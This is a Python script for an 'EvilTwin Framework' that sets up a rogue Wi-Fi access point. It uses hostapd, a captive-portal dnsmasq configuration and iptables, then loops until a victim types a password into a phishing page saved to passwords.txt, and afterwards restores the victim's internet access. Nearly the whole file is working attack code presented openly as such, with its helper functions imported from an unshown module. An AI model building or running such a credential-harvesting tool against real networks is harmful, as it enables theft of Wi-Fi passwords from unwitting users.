import os
from scapy.all import get_if_list
from prompt_toolkit import prompt
from rich.console import Console
import click
from utils import *
from pyfiglet import figlet_format
from termcolor import cprint
import subprocess
import shlex


def count_file_chars():
    char_count = 0
    with open('./website/passwords.txt', 'r') as file:
        content = file.read().replace(" ", "")
        char_count = len(content)
    return char_count


def start_dnsmasq():
    console.print(f'[bold][yellow]Starting DNS and DHCP services[/][/]')
    current_count = count_file_chars()
    create_dnsconf_captive()
    args = shlex.split("dnsmasq -C config/dns.conf -d")
    p = subprocess.Popen(args, stdout=subprocess.PIPE)
    # out, err = p.communicate()
    # print(out)
    time.sleep(2)
    console.print(f'[bold][green]DNS and DHCP successfuly started[/][/]')
    console.print(f'[bold][yellow]Waiting for password input[/][/]')


    while current_count == count_file_chars():
        console.print(f'[bold][yellow].[/][/]')
        time.sleep(1)

    console.print(f'[bold][green]Password received![/][/]')
    console.print(f'[bold][yellow]Renabling internet access for the victim[/][/]')
    p.kill()
    overwrite_dnsconf()
    p = subprocess.Popen(args, stdout=subprocess.PIPE)
    console.print(f'[bold][green]Internet access fully recovered ending the attack[/][/]')
    # out, err = p.communicate()
    # print(out)


os.system('clear')
console = Console()
cprint(figlet_format('Welcome to the EvilTwin Framework!', font='slant'), 'green', attrs=['bold'])
attack_inet = None
internet_inet = None

while 1:
    user_input = main_menu_io()
    if user_input == "0":
        os.system('clear')
        cprint(figlet_format('Goodbye!', font='slant'), 'green')
        exit()
    elif user_input == "1":
        attack_inet = attack_inet_set()
        while attack_inet not in get_if_list() or attack_inet is None:
            attack_inet = prompt(f'Please insert correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
        os.system('clear')
        internet_inet = internet_inet_set()
        while internet_inet not in get_if_list() or internet_inet is None or internet_inet == attack_inet:
            internet_inet = prompt(f'Please another correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
        set_inet_to_monitor(attack_inet)
        set_inet_unmanaged(attack_inet)
        set_netmask(attack_inet)
        set_iptables(attack_inet, internet_inet)
        ap = subprocess.Popen(shlex.split('hostapd config/hostapd.conf'))
        start_dnsmasq()
        """
        here we need to print the password and stop!!
        """
        os.system('clear')